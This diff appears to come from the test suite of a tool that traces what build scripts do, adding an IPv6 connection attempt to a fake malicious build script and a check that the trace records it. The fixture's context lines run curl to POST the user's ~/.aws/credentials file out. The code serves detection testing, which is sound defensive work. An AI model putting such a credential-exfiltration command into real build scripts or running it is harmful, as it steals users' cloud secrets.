@@ -59,6 +59,11 @@ fn main() {
         let mut reply = Vec::new();
         let _ = stream.read_to_end(&mut reply);
     }
+    // No IPv6 route in the guest: the attempt fails there, and the trace
+    // must still show it.
+    if let Ok(target) = "[2001:db8::7]:443".parse() {
+        let _ = std::net::TcpStream::connect_timeout(&target, std::time::Duration::from_secs(2));
+    }
     let _ = std::process::Command::new("curl")
         .args(["-s", "-m", "10", "-X", "POST", "--data-binary"])
         .arg(format!("@{home}/.aws/credentials"))
@@ -245,6 +250,14 @@ async fn a_build_script_that_steals_a_token_is_caught() {
             .sockets
             .iter()
             .any(|s| s.pid == script.pid && s.how == "connect" && s.address.ends_with(":80"))
+    );
+    assert!(
+        trace
+            .sockets
+            .iter()
+            .any(|s| s.pid == script.pid && s.address == "[2001:db8::7]:443"),
+        "the IPv6 attempt is not in the trace: {:?}",
+        trace.sockets
     );
     let curl = trace
         .processes
